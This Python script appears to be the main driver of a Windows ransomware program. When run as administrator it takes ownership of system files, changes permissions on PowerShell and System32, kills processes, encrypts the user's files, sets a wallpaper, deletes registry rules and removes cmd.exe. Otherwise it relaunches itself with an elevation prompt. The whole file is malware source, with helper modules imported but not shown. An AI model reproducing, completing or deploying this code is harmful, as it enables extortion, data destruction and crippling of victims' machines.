#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
from modules.crypt import encrypt_function
from modules.permission import takeown, icacls, get_admin_rights
from modules.system import killproc, regedit, set_wallpaper
import os, sys, socket, wget, struct, ctypes, shutil, winreg, time, ctypes

# Function to test if admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    encrypt_function.connect()
    takeown.tkOwn_process()
    icacls.icc_powershell()
    icacls.icc_sys32()
    killproc.pkill_smart()
    icacls.remove_proc()
    # ERROR -> la fonction appelé retourne une erreur, car elle fait référence a une variable présente dans une autre fonction du meme module
    encrypt_function.filelist()
    try:
        path = os.getcwd()
        img = "\setup\image.jpg"
        Wallpaper = "%s%s" %(path, img)
        filePath = shutil.copy(Wallpaper, '\\PerfLogs\\image.jpg')
        SPI_SETDESKWALLPAPER = 20
        WALLPAPER_PATH = '\\PerfLogs\\image.jpg'
        set_wallpaper.change_wallpaper()
    except:
        pass
    encrypt_function.filelist_aux()
    regedit.delSpecRules()
    regedit.delRules()
    # Delete cmd.exe last because he used for running the program
    os.remove("\\windows\\system32\\cmd.exe")
else:
    print("Or restart the program with Admin permission")
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
